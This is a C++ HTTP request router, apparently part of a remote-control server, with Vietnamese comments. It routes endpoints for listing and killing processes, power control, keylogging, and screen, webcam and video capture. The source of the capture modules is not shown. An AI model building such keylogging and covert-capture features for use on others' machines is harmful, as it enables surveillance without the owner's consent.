// RequestRouter.cpp
#include "RequestRouter.h"
#include "utils/helpers.h"
#include "utils/logging.h"
#include <sstream>
#include <stdexcept>

using namespace std;

RequestRouter::RequestRouter() {}

void RequestRouter::handleClient(SOCKET client, string clientIP)
{
    try
    {
        char buf[4096];
        int rec = recv(client, buf, sizeof(buf) - 1, 0);
        if (rec <= 0)
        {
            closesocket(client);
            return;
        }
        buf[rec] = 0;
        string reqStr(buf), method, path, body;

        istringstream iss(reqStr);
        iss >> method; // Chi lay 'method'

        // --- MOI: Lay fullPath (bao gom query string) ---
        size_t pathStart = reqStr.find(' ') + 1;
        if (pathStart == string::npos)
        { // Yeu cau khong hop le
            closesocket(client);
            return;
        }
        size_t pathEnd = reqStr.find(' ', pathStart);
        if (pathEnd == string::npos)
            pathEnd = reqStr.find("\r\n", pathStart);

        string fullPath = reqStr.substr(pathStart, pathEnd - pathStart);

        // Lay path 'sach' (khong co query) de so sanh
        size_t queryPos = fullPath.find('?');
        if (queryPos != string::npos)
        {
            path = fullPath.substr(0, queryPos);
        }
        else
        {
            path = fullPath;
        }
        // --- KET THUC THAY DOI ---

        size_t bodyPos = reqStr.find("\r\n\r\n");
        if (bodyPos != string::npos)
            body = reqStr.substr(bodyPos + 4);

        // --- THAY DOI LOGIC LAY ID ---
        string clientId = getHeader(reqStr, "X-Client-ID");

        if (clientId.empty())
        {
            // Bay gio chung ta tim trong 'fullPath', khong phai 'path'
            if (path.find("/api/stream") == 0 || path.find("/screenshot") == 0)
            {
                clientId = getQueryParam(fullPath, "clientId", true);
            }

            if (clientId.empty())
            {
                clientId = clientIP; // Fallback
            }
        }
        // --- KET THUC THAY DOI ---

        if (method == "GET")
        {
            if (path.find("/api") == 0)
            {
                if (path == "/api/processes")
                    m_processController.handleGetProcesses(client);
                else if (path == "/api/apps")
                    m_appController.handleGetApps(client);
                else if (path.find("/api/keylog") == 0)
                    m_keylogController.handleGetKeylog(client);
                else if (path.find("/api/devices") == 0)
                    m_deviceController.handleGetDevices(client, fullPath, clientId); // Truyen fullPath
                else if (path.find("/api/stream/screen") == 0)
                    m_screenController.handleScreenStream(client, clientId);
                else if (path.find("/api/stream/cam") == 0)
                    m_deviceController.handleStreamCam(client, fullPath, clientId); // Truyen fullPath
                else
                    sendFileResponse(client, "404 API Not Found", "text/plain", 404);
            }
            else if (path.find("/screenshot") == 0)
            {
                m_screenController.handleScreenshot(client, fullPath, clientId); // Truyen fullPath
            }
            else
            {
                m_staticFileController.handleFileRequest(client, path, clientId);
            }
        }
        else if (method == "POST")
        {
            // ... (POST logic khong doi, vi no luon dung header X-Client-ID) ...
            if (path == "/api/start")
                m_appController.handleStartApp(client, body);
            else if (path == "/api/kill")
                m_processController.handleKillProcess(client, body);
            else if (path == "/api/app/close")
                m_appController.handleCloseApp(client, body);
            else if (path == "/api/power")
                m_systemController.handlePower(client, body);
            else if (path == "/api/keylog/set")
                m_keylogController.handleSetKeylog(client, body);
            else if (path == "/api/clientlog")
            {
                string msg = getQueryParam(body, "msg", true);
                string success_str = getQueryParam(body, "success", false);
                string prefix = (success_str == "true") ? "[OK] " : "[FAIL] ";
                logConsole(clientId, prefix + msg);
                sendAll(client, "HTTP/1.1 204 No Content\r\n\r\n");
            }
            else if (path == "/api/video/capture")
                m_deviceController.handleRecordVideo(client, body, clientId);
            else
                sendFileResponse(client, "404 API Not Found", "text/plain", 404);
        }

        closesocket(client);
    }
    catch (const std::exception &e)
    {
        logConsole(clientIP, "LOI NGHIEM TRONG: " + string(e.what()));
        sendFileResponse(client, "500 Internal Server Error", "text/plain", 500);
        closesocket(client);
    }
    catch (...)
    {
        logConsole(clientIP, "LOI KHONG XAC DINH!");
        sendFileResponse(client, "500 Internal Server Error", "text/plain", 500);
        closesocket(client);
    }
}